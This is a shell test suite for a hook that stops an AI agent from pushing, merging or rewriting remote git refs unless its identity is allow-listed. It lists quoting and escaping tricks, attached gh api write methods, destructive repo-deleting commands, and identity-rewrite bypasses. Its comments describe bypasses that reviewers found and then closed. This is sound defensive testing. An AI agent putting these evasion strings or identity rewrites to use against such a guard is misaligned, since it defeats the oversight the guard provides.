mg_both 'git pu"sh" (dq fragment)'          'git pu"sh" origin main'
mg_both "\$'git' push (ANSI-C quoting)"     "\$'git' push origin main"
mg_both '"git" push (fully quoted)'         '"git" push origin main'
mg_both "g\\h api -X PUT (a remote ref move)" 'g\h api -X PUT /repos/o/r/git/refs/heads/main -f sha=abc'
mg_both "'gh' pr merge"                     "'gh' pr merge 12"
mg_both "escaped subcommand: git me\\rge"   'git me\rge feature/x'

# NOT FILED BY ANY REVIEW — found by driving the COVERED bullet itself, which says "shell QUOTING or
# ESCAPING of the command word OR THE SUBCOMMAND ... `\$'git' push`". The normalisation that strips
# the `\$`/`{`/quote decoration shlex leaves behind lived INSIDE prog_name, so it ran on the PROGRAM
# word only. `\$'git' push` blocked; `git \$'push'`, `gh \$'pr' merge` and — worst — `git \$'config'
# user.email <v>` PERMITTED. Same class as SEC-03, same class of false COVERED claim as SEC-02.
# unquote() now runs wherever a token is compared against a fixed name.
t_case "AC-014/SEC-03 ANSI-C quoting of the SUBCOMMAND, not just of the command word"
mg_both "git \$'push' (quoted subcommand)"  "git \$'push' origin main"
mg_both "git \$'merge'"                     "git \$'merge' feature/x"
mg_both "git \$'pull'"                      "git \$'pull' origin main"
mg_both "gh \$'pr' merge (quoted GROUP)"    "gh \$'pr' merge 12"
mg_both "gh pr \$'merge' (quoted gh sub)"   "gh pr \$'merge' 12"
mg_both "git \$'config' user.email <v>"     "git \$'config' --global user.email a@b.c"
mg_both "git config \$'user.email' <v>"     "git config --global \$'user.email' a@b.c"
mg_both "both words quoted"                 "\$'git' \$'push' origin main"
mg_both "quoted git GLOBAL flag before it"  "git \$'--no-pager' push origin main"
# `${push}` is a VARIABLE expansion, so this is deliberate OVER-blocking, not a closed bypass: the
# same `{`-stripping has always applied to the command word (`${git} push`), and erring toward a
# block on a variable named exactly `push` is the fail-closed direction. Asserted so it is a
# recorded choice rather than an accident.
mg_both "git \${push} — over-blocks on purpose" 'git ${push} origin main'
mg_both "gh api \$'-X' PUT"                 "gh api \$'-X' PUT repos/o/r/pulls/1/update-branch"
# The normalisation must not invent matches: these are NOT the gated subcommands.
for c in "git \$'merge-base' main HEAD" "git \$'status'" "git \$'commit' -qm x" \
         "git config --global \$'core.editor' vim" "gh \$'issue' comment 5"; do
  assert_rc "not gated: $c" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$c"
done

t_case "AC-014 gh-based merge paths"
assert_rc "gh pr merge"                            1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh pr merge'
assert_rc "gh pr merge <n> --squash"               1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh pr merge 12 --squash'
assert_rc "gh pr merge --admin"                    1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh pr merge --admin'
assert_rc "gh api POST /repos/*/merges"            1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api -X POST repos/o/r/merges -f base=main -f head=x'
assert_rc "gh api --method POST /merges"           1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api --method POST repos/o/r/merges'
assert_rc "gh api /merges with NO -X (fields imply POST)" 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api repos/o/r/merges -f base=main -f head=x'
assert_rc "gh api PATCH /git/refs/heads/main"      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api -X PATCH repos/o/r/git/refs/heads/main -f sha=abc'
assert_rc "gh api PUT /git/refs/heads/main"        1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api -X PUT repos/o/r/git/refs/heads/main'
assert_rc "gh api DELETE (any write method)"       1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api -X DELETE repos/o/r/git/refs/heads/x'
assert_rc "gh api /pulls/N/merge"                  1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api repos/o/r/pulls/12/merge -X PUT'
assert_rc "gh api --input - (a body is a write)"   1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api repos/o/r/merges --input -'
assert_rc "gh release create (creates a remote ref)" 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh release create v1.0.0'
assert_rc "gh repo sync (moves a branch ref)"      1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh repo sync o/r'
assert_rc "an absolute path to gh"                 1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command '/opt/homebrew/bin/gh pr merge 3'
assert_output "the message names WHICH surface matched" "matched surface : gh pr merge" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh pr merge 12'

t_case "AC-014/SEC-05 an ATTACHED gh method flag is a method (-XPUT, not just -X PUT)"
# `gh` accepts -XPUT. The parser only knew `-X VALUE`, `--method VALUE` and `--method=VALUE`, so
# -XPUT fell through the generic startswith("-") skip and `method` stayed None — which un-gated
# `gh api -XPUT /repos/o/r/pulls/1/update-branch` (moves a branch) and `gh api -XDELETE repos/o/r`
# (deletes the repo), because neither path contains /merges, /git/refs or /pulls/N/merge.
mg_both "gh api -XPUT (update-branch)"     'gh api -XPUT /repos/o/r/pulls/1/update-branch'
mg_both "gh api -XDELETE repos/o/r"        'gh api -XDELETE repos/o/r'
mg_both "gh api -XPOST"                    'gh api -XPOST repos/o/r/issues'
mg_both "gh api -XPATCH"                   'gh api -XPATCH repos/o/r'
mg_both "gh api -Xput (lower case)"        'gh api -Xput repos/o/r/pulls/1/update-branch'
mg_both "gh api --method=DELETE"           'gh api --method=DELETE repos/o/r'
assert_output "  the matched label names the method" "gh api -X PUT (remote write)" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api -XPUT /repos/o/r/pulls/1/update-branch'
# A value-taking GLOBAL flag must not swallow the command group. Latent before: the leading-flag
# skip took the flag's VALUE as the group, so the whole gh surface would silently un-gate the day
# `gh` gained one.
mg_both "a global flag with a VALUE before the group" 'gh --hostname github.example.com pr merge 3'
assert_rc "  and an unrelated gh group is still not gated" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh issue comment 5 --body "gh pr merge is gated"'

# ==================================== AC-013/AC-014/SEC-04 · the guard's own identity axis
# THE BYPASS THIS CLOSES, verified end to end by the reviewer: the block message printed
# `git config --global user.email <an address read out of the allowlist>`, that command was gated by
# neither this guard nor .claude/settings.json's ask/deny, and running it flipped block(1) ->
# permit(0). One un-gated, un-prompted Bash call, dictated by the control, available to the exact
# actor the control exists to restrain.
#
# Two halves are asserted here: the WRITE is now on the gated surface, and the message no longer
# hands over the command. A check whose only input is a value the caller may rewrite is not a check.
t_case "AC-013/SEC-04 a git-config WRITE to the guard's own identity axis is gated"
mg_both "git config --global user.email <v>"     'git config --global user.email a@b.c'
mg_both "git config user.email <v> (repo-local)" 'git config user.email a@b.c'
mg_both "git config --local user.name <v>"       'git config --local user.name Somebody'
mg_both "git config --replace-all user.email"    'git config --replace-all user.email a@b.c'
mg_both "git config --add user.email"            'git config --global --add user.email a@b.c'
mg_both "git config --unset user.email"          'git config --unset user.email'
mg_both "git config --unset-all user.name"       'git config --unset-all user.name'
mg_both "git config set user.email (verb form)"  'git config set user.email a@b.c'
mg_both "git config unset user.name (verb form)" 'git config unset user.name'
mg_both "git -C <path> config user.email"        'git -C /tmp/other config user.email a@b.c'
mg_both "git config -f <file> user.email"        'git config -f /tmp/other.cfg user.email a@b.c'
mg_both "git config --system user.email"         'git config --system user.email a@b.c'
mg_both "USER.EMAIL (git keys are case-insensitive)" 'git config --global USER.EMAIL a@b.c'
mg_both "behind a launcher"                      'sudo -u josh git config --global user.email a@b.c'
mg_both "behind bash -ec"                        "bash -ec 'git config --global user.email a@b.c'"

t_case "AC-013/SEC-04 THE EXACT one-command bypass the review executed is now refused"
# Not a paraphrase: the command is built from the SAME allowlist value the old message printed, so
# if the guard ever stops gating this the assertion fails with the real string in it.
assert_rc "\`git config --global user.email <allow-listed>\` is refused, not permitted" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "git config --global user.email $ALLOWED_EMAIL"
assert_rc "  and it BLOCKS the tool call through the hook" 2 \
  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "git config --global user.email $ALLOWED_EMAIL"
assert_output "  and the block names the identity write as the matched surface" \
  "matched surface : git config (writes user.email)" \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "git config --global user.email $ALLOWED_EMAIL"

t_case "AC-024/SEC-04 git-config READS and non-identity keys are NOT gated (no false positives)"
# Gating the write must not gate reading your own config, or setting an unrelated key. `git config
# user.email` with no value is the READ the guard itself performs.
for c in 'git config user.email' 'git config --get user.email' 'git config --get-all user.email' \
         'git config --list' 'git config -l' 'git config --get-regexp ^user' \
         'git config get user.email' 'git config list' \
         'git config --global core.editor vim' 'git config --global --unset core.pager' \
         'git config --get remote.origin.url' 'git config --global init.defaultBranch main'; do
  assert_rc "not gated: $c" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$c"
done
assert_rc "git -c user.email=... <subcommand> is NOT gated (it cannot persist an identity)" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git -c user.email=eval@firm -c user.name=eval commit -qm fixture'
# ...and that spelling cannot spoof the guard either: identity is resolved by RUNNING
# `git config user.email`, which ignores a `-c` on some other command line.
assert_rc "and `git -c user.email=<allow-listed> push` is still refused" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "git -c user.email=$ALLOWED_EMAIL push origin main"

t_case "AC-014/AC-024 NO FALSE POSITIVES — these must all be permitted untouched"
# A false positive here does not merely annoy: `git merge-base` is used by firm-integrate, and a
# commit message containing the word "merge" is routine in this repo. Blocking either would make
# the firm unusable, which is why matching is structural rather than substring-based.
assert_rc "git merge-base"                         0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge-base main HEAD'
assert_rc "git merge-file"                         0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge-file a b c'
assert_rc "git merge-tree"                         0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge-tree main feature'
assert_rc "a commit message containing 'merge'"    0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git commit -m "docs: explain the merge gate"'
assert_rc "a commit message containing 'git push'" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git commit -m "docs: note that git push is denied"'
assert_rc "a commit message with an OPERATOR and 'git push' INSIDE the quotes" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git commit -m "gate; git push is refused"'
assert_rc "git log"                                0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git log --oneline -5'
assert_rc "git fetch"                              0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git fetch origin'
assert_rc "git status"                             0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git status --porcelain'
assert_rc "grep for the string 'git push' in docs" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'grep -rn "git push" docs/'
assert_rc "read-only gh api (a GET)"               0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh api repos/o/r/branches/main --jq .protected'
assert_rc "gh pr list / view"                      0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh pr view 12'
assert_rc "the word 'high' (substring 'gh')"       0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'echo "effort level high"'
assert_rc "a path containing .github"              0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'cat .github/workflows/ci.yml'
assert_rc "a python heredoc mentioning git push"   0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "python3 - <<'PY'
print('git push origin main')
PY"
assert_rc "the firm's own suite runner"            0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'bash tests/run-tests.sh'
assert_rc "firm-integrate (merges internally, by its own allowlist)" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'firm-integrate 20260803T120043Z-slug wo-a wo-b'
assert_rc "firm-qa-checkout"                       0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'firm-qa-checkout 20260803T120043Z-slug'
assert_rc "firm-run-evals --structural"            0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'bin/firm-run-evals --structural'

# ============================================================ AC-015 · cannot determine => BLOCK
t_case "AC-015 every indeterminate identity path BLOCKS (exit 2), never passes"
assert_rc "gh binary ABSENT"                       2 mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
assert_output "  and says the binary is missing" "gh-absent" \
  mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
GH_UNAUTH="$(mk_stub_gh unauth)"
assert_rc "gh present but UNAUTHENTICATED"         2 mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
assert_output "  and quotes gh's own failure" "gh auth login" \
  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
GH_EMPTY="$(mk_stub_gh empty)"
assert_rc "gh returns EMPTY output"                2 mg "$TREE" "$GH_EMPTY" "$REPO_OK" --command 'git push origin main'
assert_output "  and says the output was empty" "gh-empty" \
  mg "$TREE" "$GH_EMPTY" "$REPO_OK" --command 'git push origin main'
GH_MALFORMED="$(mk_stub_gh malformed)"
assert_rc "gh returns MALFORMED/non-login output"  2 mg "$TREE" "$GH_MALFORMED" "$REPO_OK" --command 'git push origin main'
assert_output "  and says it is not a login" "gh-malformed" \
  mg "$TREE" "$GH_MALFORMED" "$REPO_OK" --command 'git push origin main'
GH_OFFLINE="$(mk_stub_gh offline)"
assert_rc "NO NETWORK (dns failure from gh)"       2 mg "$TREE" "$GH_OFFLINE" "$REPO_OK" --command 'git push origin main'

t_case "AC-015 an unset or empty git identity BLOCKS"
# GIT_CONFIG_GLOBAL/SYSTEM are neutralised (git >= 2.32) so the machine's real ~/.gitconfig cannot
# supply a value and make this test pass for the wrong reason.
#
# HOME is deliberately NOT overridden, even though that is the obvious way to hide ~/.gitconfig:
# pyyaml on this platform is a `pip install --user` package living under $HOME, so a changed HOME
# makes `import yaml` fail and the guard then blocks on the ALLOWLIST path — exit 2 either way, so
# the assertion below would still have gone green while testing something else entirely. That is a
# test passing for the wrong reason, which is the failure mode this suite exists to prevent.
NOID_REPO="$(mk_repo)"
git -C "$NOID_REPO" config --unset user.email >/dev/null 2>&1
mg_noid() {
  ( cd "$NOID_REPO" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
      PATH="$GH_OK:$PATH" "$TREE/bin/firm-merge-guard" "$@" )
}
assert_eq "fixture really has no resolvable user.email" "" \
  "$( cd "$NOID_REPO" && GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git config user.email 2>/dev/null )"
assert_rc "git config user.email unset -> cannot evaluate" 2 mg_noid --command 'git push origin main'
assert_output "  and names the unresolved source" "git-unset" mg_noid --command 'git push origin main'

t_case "AC-015/AC-018 a missing or unparseable allowlist is cannot-evaluate, never a pass"
BROKEN="$(mk_guard_tree)"
rm -f "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "allowlist file MISSING"                 2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
assert_output "  and names the missing file" "allowlist file is missing" \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed: [\n' > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "allowlist UNPARSEABLE yaml"             2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed: []\n' > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "allowlist an EMPTY list (no vacuous pass)" 2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
assert_output "  and says so explicitly" "never a vacuous pass" \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
# ONE AXIS AT A TIME. A single fixture with a wildcard in BOTH fields passes for either reason, so
# it cannot tell which check is doing the work — and mutation testing proved exactly that: deleting
# the gh_login wildcard guard left the combined fixture GREEN, because the git_emails guard was
# still catching it. Each field therefore gets its own fixture, with the OTHER field valid.
printf 'allowed:\n  - gh_login: "*"\n    git_emails: [%s]\n' "$ALLOWED_EMAIL" \
  > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "a WILDCARD gh_login is rejected (with a valid email alongside)" 2 \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
assert_output "  and says which field" "gh_login" \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed:\n  - gh_login: %s\n    git_emails: ["*"]\n' "$ALLOWED_LOGIN" \
  > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "a WILDCARD git_emails is rejected (with a valid login alongside)" 2 \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
assert_output "  and says which field" "git_emails" \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed:\n  - gh_login: "?ny"\n    git_emails: [%s]\n' "$ALLOWED_EMAIL" \
  > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "a single-character glob in gh_login is rejected too" 2 \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed:\n  - gh_login: %s\n    git_emails: [""]\n' "$ALLOWED_LOGIN" \
  > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "a BLANK email is rejected, not treated as matching everything" 2 \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed:\n  - gh_login: ""\n    git_emails: [%s]\n' "$ALLOWED_EMAIL" \
  > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "a BLANK gh_login is rejected"                     2 \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'allowed:\n  - gh_login: %s\n    git_names: [josh]\n    git_emails: [%s]\n' \
  "$ALLOWED_LOGIN" "$ALLOWED_EMAIL" > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "an UNKNOWN key is rejected (the file cannot claim a source the code ignores)" 2 \
  mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'
printf 'unexpected_top_level: 1\nallowed:\n  - gh_login: x\n    git_emails: [a@b.c]\n' \
  > "$BROKEN/agent-firm/policy/merge-authority.yaml"
assert_rc "an unknown TOP-LEVEL key is rejected"   2 mg "$BROKEN" "$GH_OK" "$REPO_OK" --command 'git push origin main'

t_case "AC-015 no usable YAML parser is cannot-evaluate (not a silent downgrade)"
# pyyaml ABSENT: a python3 wrapper that adds -S, so site-packages is never loaded and
# importlib.util.find_spec('yaml') genuinely returns None.
NOYAML="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-noyaml.XXXXXX")"; t_track "$NOYAML"
REALPY="$(command -v python3)"
printf '#!/bin/sh\nexec %s -S "$@"\n' "$REALPY" > "$NOYAML/python3"; chmod +x "$NOYAML/python3"
if [ "$(PATH="$NOYAML:$PATH" python3 -c "import importlib.util; print(importlib.util.find_spec('yaml') is None)" 2>/dev/null)" = "True" ]; then
  assert_rc "pyyaml ABSENT -> cannot evaluate" 2 \
    mg "$TREE" "$GH_OK:$NOYAML" "$REPO_OK" --command 'git push origin main'
  assert_output "  and says pyyaml is not installed" "pyyaml is not installed" \
    mg "$TREE" "$GH_OK:$NOYAML" "$REPO_OK" --command 'git push origin main'
else
  _t_no "pyyaml-absent fixture could not be built (python3 -S still imports yaml)" \
        "skipping would hide the case, so this is a FAIL not a skip"
fi
# pyyaml INSTALLED BUT UNIMPORTABLE: a broken install must be told apart from an absent one.
POISON="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-poison.XXXXXX")"; t_track "$POISON"
mkdir -p "$POISON/yaml"
printf 'raise ImportError("simulated broken pyyaml install")\n' > "$POISON/yaml/__init__.py"
mg_poison() { ( cd "$REPO_OK" && PYTHONPATH="$POISON" PATH="$GH_OK:$PATH" "$TREE/bin/firm-merge-guard" "$@" ); }
assert_rc "pyyaml present but UNIMPORTABLE -> cannot evaluate" 2 mg_poison --command 'git push origin main'
assert_output "  and distinguishes broken from absent" "unimportable" mg_poison --command 'git push origin main'

t_case "AC-015/SEC-06 the in-script wait budget provably fits under the REGISTERED hook timeout"
# A hook that exceeds its framework timeout does not block — so the fail-closed property depends on
# an inequality between two numbers in three different files, and nothing asserted it. Measured
# worst case with BOTH identity sources hung was 24s against a 30s registered timeout: 6s of
# headroom, and the evidence file said 20s. The waits are now 8/4/1 (14s worst case) and this test
# fails if anyone raises them, or lowers a registered timeout, without re-doing the arithmetic.
assert_ok "GH_TIMEOUT + GIT_TIMEOUT + 2*KILL_GRACE + margin <= the timeout in BOTH registrations" python3 -c "
import json, re
src = open('$GUARD').read()
m = re.search(r'^GH_TIMEOUT, GIT_TIMEOUT, KILL_GRACE = (\d+), (\d+), (\d+)\$', src, re.M)
assert m, 'could not parse the wait constants out of the guard'
gh, gt, grace = (int(x) for x in m.groups())
mm = re.search(r'^HOOK_BUDGET_MARGIN = (\d+)\$', src, re.M)
assert mm, 'could not parse HOOK_BUDGET_MARGIN out of the guard'
budget = gh + gt + 2 * grace + int(mm.group(1))
found = []
for path in ('$SETTINGS', '$PLUGIN_HOOKS'):
    d = json.load(open(path))
    for entry in d['hooks']['PreToolUse']:
        for h in entry['hooks']:
            if 'firm-merge-guard' in h['command']:
                t = h.get('timeout')
                assert t is not None, f'{path}: the guard hook registration has no explicit timeout'
                found.append((path.rsplit('/', 1)[-1], t))
                assert budget <= t, (f'{path}: worst case {gh}+{gt}+2*{grace}+{mm.group(1)}={budget}s '
                                     f'does not fit under the registered {t}s hook timeout')
assert len(found) == 2, f'expected the guard in BOTH registrations, found {found}'
print('ok', found, 'budget', budget)
"
assert_ok "the KILL_GRACE constant is the one actually used to reap a hung child" python3 -c "
src = open('$GUARD').read()
assert 'p.communicate(timeout=KILL_GRACE)' in src, 'the kill grace is hard-coded, so the budget test lies'
"
assert_ok "and the guard's own header states the arithmetic, with the numbers" python3 -c "
import re
# Slice to the END OF THE HEADER (the first line of real code) rather than to a fixed line number:
# a magic number turns 'somebody added a paragraph' into a failure about wait budgets, which is a
# test failing for the wrong reason. Still excludes the runtime block message 900 lines lower.
lines = open('$GUARD').readlines()
end = next(i for i, l in enumerate(lines) if l.startswith('set -uo pipefail'))
flat = re.sub(r'\s+', ' ', ''.join(lines[:end]).replace('#', ' '))
assert 'GH_TIMEOUT + GIT_TIMEOUT + 2 * KILL_GRACE' in flat, flat[-900:]
assert re.search(r'\(8 \+ 4 \+ 2 = 14 s worst case', flat), flat[-900:]
"

t_case "AC-016/SEC-07 an interpreter that dies with status 1 is cannot-evaluate, not a DECISION"
# The contract says 1 = 'identity resolved and NOT allow-listed'. python3 dying of a syntax error,
# a bad shebang or a failed exec also exits 1, and 1 used to be INSIDE the pass-through case arm —
# so a broken interpreter was reported as a decision, with no message and no ledger event. The
# checker now exits 3 for a refusal, so a bare 1 can only mean 'not from the checker'.
PYFAIL1="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyfail1.XXXXXX")"; t_track "$PYFAIL1"
printf '#!/bin/sh\nexit 1\n' > "$PYFAIL1/python3"; chmod +x "$PYFAIL1/python3"
PYFAIL99="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyfail99.XXXXXX")"; t_track "$PYFAIL99"
printf '#!/bin/sh\nexit 99\n' > "$PYFAIL99/python3"; chmod +x "$PYFAIL99/python3"
assert_rc "python3 exits 1 -> 2 (cannot evaluate), NOT 1 (a refusal)" 2 \
  mg "$TREE" "$PYFAIL1" "$REPO_OK" --command 'git push origin main'
assert_output "  and it says the checker itself failed" "the checker itself exited 1" \
  mg "$TREE" "$PYFAIL1" "$REPO_OK" --command 'git push origin main'
assert_output "  and says no ledger event was reached (so the silence is explained)" \
  "nothing was recorded in the ledger" \
  mg "$TREE" "$PYFAIL1" "$REPO_OK" --command 'git push origin main'
assert_rc "python3 exits 99 -> 2" 2 mg "$TREE" "$PYFAIL99" "$REPO_OK" --command 'git push origin main'
assert_rc "python3 exits 1, hook mode -> 2 (blocks)" 2 \
  mg_hook "$TREE" "$PYFAIL1" "$REPO_OK" 'git push origin main'
# The real refusal path must still report 1 through the wrapper — the 3->1 mapping is load-bearing.
assert_rc "a REAL refusal is still reported as 1, not 3" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'

t_case "AC-015/AC-016/SEC-17 an exit CODE alone cannot author a decision — the sentinel must agree"
# SEC-07 moved the refusal to process exit 3 so a broken interpreter's bare 1 could not be misread
# as the decision "identity resolved and not allow-listed". That left the contract one code narrower
# rather than closed: an interpreter that happens to exit 3 was still reported AS a refusal (SEC-17),
# and — the half nobody filed, and the one that matters — an interpreter that exits 0 was reported as
# a PERMIT. `python3` shims and wrappers are ordinary, and a `python3` that ignores stdin exits 0, so
# a gated command could reach exit 0 without a line of the checker ever running. That is a FAIL-OPEN
# on a control whose entire value is that it fails closed.
#
# The checker now prints a proof-of-execution sentinel on STDOUT and the wrapper honours 0 or 3 only
# when it agrees. BOTH directions are asserted: the stub codes must block, and the REAL interpreter
# must still be able to reach permit AND refuse (otherwise this test would pass on a guard that
# simply blocked everything).
PYEXIT0="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyexit0.XXXXXX")"; t_track "$PYEXIT0"
printf '#!/bin/sh\nexit 0\n' > "$PYEXIT0/python3"; chmod +x "$PYEXIT0/python3"
PYEXIT3="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyexit3.XXXXXX")"; t_track "$PYEXIT3"
printf '#!/bin/sh\nexit 3\n' > "$PYEXIT3/python3"; chmod +x "$PYEXIT3/python3"
PYQUIET="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyquiet.XXXXXX")"; t_track "$PYQUIET"
printf '#!/bin/sh\ncat >/dev/null\nexit 0\n' > "$PYQUIET/python3"; chmod +x "$PYQUIET/python3"
assert_rc "python3 exits 0 with no sentinel -> 2, NOT 0 (this was a FAIL-OPEN)" 2 \
  mg "$TREE" "$PYEXIT0" "$REPO_OK" --command 'git push origin main'
assert_rc "  and through the hook it BLOCKS" 2 \
  mg_hook "$TREE" "$PYEXIT0" "$REPO_OK" 'git push origin main'
assert_rc "a python3 that swallows the program and exits 0 -> 2" 2 \
  mg "$TREE" "$PYQUIET" "$REPO_OK" --command 'git push origin main'
assert_rc "python3 exits 3 with no sentinel -> 2, NOT 1 (SEC-17)" 2 \
  mg "$TREE" "$PYEXIT3" "$REPO_OK" --command 'git push origin main'
assert_output "  and says the exit could not be read as a decision" \
  "did not emit its proof-of-execution sentinel" \
  mg "$TREE" "$PYEXIT3" "$REPO_OK" --command 'git push origin main'
assert_output "  and names which decision that code would have meant" 'would mean "refuse"' \
  mg "$TREE" "$PYEXIT3" "$REPO_OK" --command 'git push origin main'
assert_output "  and the 0 case names the permit it refused to honour" 'would mean "permit"' \
  mg "$TREE" "$PYEXIT0" "$REPO_OK" --command 'git push origin main'
assert_output "  and says nothing was recorded in the ledger" "nothing was recorded in the" \
  mg "$TREE" "$PYEXIT0" "$REPO_OK" --command 'git push origin main'
# CONTROL: with the real python3, both decisions are still reachable. Without these, the four
# assertions above would also pass on a guard that had simply stopped permitting anything.
assert_rc "control: the REAL checker can still reach permit (0)" 0 \
  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main'
assert_rc "control: the REAL checker can still reach refuse (1)" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
assert_rc "control: and cannot-evaluate (2) needs no sentinel" 2 \
  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
# The sentinel is on STDOUT, so stderr — which carries the block message to the agent — is untouched.
assert_output "the human-readable block message still reaches stderr verbatim" \
  "identity NOT authorised" mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
assert_eq "and the sentinel is NOT leaked onto the caller's stdout" "" \
  "$(mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main' 2>/dev/null)"
assert_eq "  nor on a permit" "" \
  "$(mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main' 2>/dev/null)"
assert_eq "  nor through the hook adapter" "" \
  "$(mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main' 2>/dev/null)"
# --surface writes a REPORT on stdout, so it must not emit a sentinel there.
assert_not_output "--surface does not print the sentinel" "FIRM_MG_DECISION" \
  mg_env "$TREE" "$PATH" "$REPO_OK" --surface

t_case "AC-016/SEC-08 --command with no value is cannot-evaluate, not an authorisation"
# `firm-merge-guard --command \"\$CMD\"` with an unset variable used to yield exit 0. Every other
# unreadable input in this script exits 2; this is the same class of input.
assert_rc "--command with the flag but NO value" 2 mg_env "$TREE" "$PATH" "$REPO_OK" --command
assert_rc "--command with an EMPTY value" 2 mg_env "$TREE" "$PATH" "$REPO_OK" --command ''
assert_output "  and says what was missing" "no command string" \
  mg_env "$TREE" "$PATH" "$REPO_OK" --command
# The empty-command-inside-a-VALID-hook-payload case is different and stays a permit — there is
# genuinely nothing to run there. It is asserted in the AC-016 hook-payload section below.

t_case "AC-015 an unparseable COMMAND is cannot-evaluate, not a pass"
assert_rc "an unbalanced quote around a push" 2 \
  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin "main'
assert_rc "an unknown ARGUMENT to the guard itself is not a licence to permit" 2 \
  mg "$TREE" "$GH_OK" "$REPO_OK" --allow-everything

# ============================================================ AC-016 · the exit contract
t_case "AC-016 the three-way exit contract"
assert_rc "0 = identity resolved AND allow-listed"        0 mg "$TREE" "$GH_OK"  "$REPO_OK"  --command 'git push origin main'
